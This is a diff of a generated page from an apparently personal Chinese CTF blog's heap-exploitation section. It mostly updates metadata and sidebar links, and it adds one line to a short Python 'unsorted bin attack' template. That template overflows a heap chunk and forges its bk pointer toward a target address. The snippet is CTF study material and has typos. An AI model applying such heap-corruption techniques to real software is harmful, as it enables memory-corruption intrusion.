@@ -31,7 +31,7 @@
 <meta property="og:image" content="https://tforevery.github.io/Images/1750237888451-e7f75cdc-6ed1-4766-85e3-bed34b78295b.png">
 <meta property="og:image" content="https://tforevery.github.io/Images/5374ddfc-23cf-47ff-b478-d8035ac83f90.png">
 <meta property="article:published_time" content="2025-12-23T16:50:44.000Z">
-<meta property="article:modified_time" content="2025-12-23T17:14:14.402Z">
+<meta property="article:modified_time" content="2025-12-24T12:20:06.283Z">
 <meta property="article:author" content="TY">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://tforevery.github.io/Images/1750237656883-2fbb0e3d-ede5-4cba-8b17-52ed89050c4e.png">
@@ -240,7 +240,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          495 字
+          497 字
         
       </span>
     
@@ -310,7 +310,7 @@
         aria-expanded="true"
       >
         PWN
-        <span class="list-group-count">(12)</span>
+        <span class="list-group-count">(13)</span>
         <i class="iconfont icon-arrowright"></i>
       </a>
       
@@ -401,7 +401,7 @@
         aria-expanded="true"
       >
         HEAP
-        <span class="list-group-count">(7)</span>
+        <span class="list-group-count">(8)</span>
         <i class="iconfont icon-arrowright"></i>
       </a>
       
@@ -412,6 +412,15 @@
           
   <div class="category-post-list">
     
+    
+      
+      
+        <a href="/PWN/HEAP/Fastbin-Attack/" title="Fastbin Attack"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">Fastbin Attack</span>
+        </a>
+      
     
       
       
@@ -433,19 +442,19 @@
     
       
       
-        <a href="/PWN/HEAP/House-Of-Spirit/" title="House Of Spirit"
+        <a href="/PWN/HEAP/Off-By-One/" title="Off By One"
            class="list-group-item list-group-item-action
            ">
-          <span class="category-post">House Of Spirit</span>
+          <span class="category-post">Off By One</span>
         </a>
       
     
       
       
-        <a href="/PWN/HEAP/Off-By-One/" title="Off By One"
+        <a href="/PWN/HEAP/Tcache-attack/" title="Tcache attack"
            class="list-group-item list-group-item-action
            ">
-          <span class="category-post">Off By One</span>
+          <span class="category-post">Tcache attack</span>
         </a>
       
     
@@ -540,7 +549,7 @@
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2025年12月24日 凌晨
+                    本文最后更新于 2025年12月24日 晚上
                   
                 
               </p>
@@ -549,7 +558,7 @@
               <div class="markdown-body">
                 
                 <h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/introduction/">CTF-WIKI</a></p>
-<h1 id="Unsortedthunk模板"><a href="#Unsortedthunk模板" class="headerlink" title="Unsortedthunk模板"></a>Unsortedthunk模板</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#amd64-chunk</span><br>Add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;TY&#x27;</span>)<br>Add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;TY&#x27;</span>)<br>Add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;TY&#x27;</span>)<br><br>Del(<span class="hljs-number">1</span>)<br><br>taget = <span class="hljs-number">0x06020C0</span><br>prev_size = <span class="hljs-number">0</span><br>thunck_size = <span class="hljs-number">0x91</span><br>fd = <span class="hljs-number">0</span><br>bk = taget - <span class="hljs-number">0x10</span><br><br>thunk_1 = p(prev_size) + p(thunck_size)<br>thunk_1 += p(fd) + p(bk)<br><br>payload = junk(<span class="hljs-number">0x20</span>)<br>payload += thunck_1<br><br>Edit(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload),payload)<br></code></pre></td></tr></table></figure>
+<h1 id="Unsortedthunk模板"><a href="#Unsortedthunk模板" class="headerlink" title="Unsortedthunk模板"></a>Unsortedthunk模板</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#amd64-chunk</span><br>Add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;TY&#x27;</span>)<br>Add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;TY&#x27;</span>)<br>Add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;TY&#x27;</span>)<br><br>Del(<span class="hljs-number">1</span>)<br><br>taget = <span class="hljs-number">0x06020C0</span><br>prev_size = <span class="hljs-number">0</span><br>thunck_size = <span class="hljs-number">0x91</span><br>fd = <span class="hljs-number">0</span><br>bk = taget - <span class="hljs-number">0x10</span><br><br>thunk_1 = p(prev_size) + p(thunck_size)<br>thunk_1 += p(fd) + p(bk)<br><br>payload = junk(<span class="hljs-number">0x20</span>)<br>payload += thunck_1<br><br>Edit(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(payload),payload)<br>Add(<span class="hljs-number">0x80</span>)<br></code></pre></td></tr></table></figure>
 
 <h1 id="实现要求"><a href="#实现要求" class="headerlink" title="实现要求"></a>实现要求</h1><ul>
 <li>堆溢出</li>
@@ -698,9 +707,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/PWN/HEAP/House-Of-Spirit/" title="House Of Spirit">
+                      <a href="/PWN/HEAP/Fastbin-Attack/" title="Fastbin Attack">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">House Of Spirit</span>
+                        <span class="hidden-mobile">Fastbin Attack</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
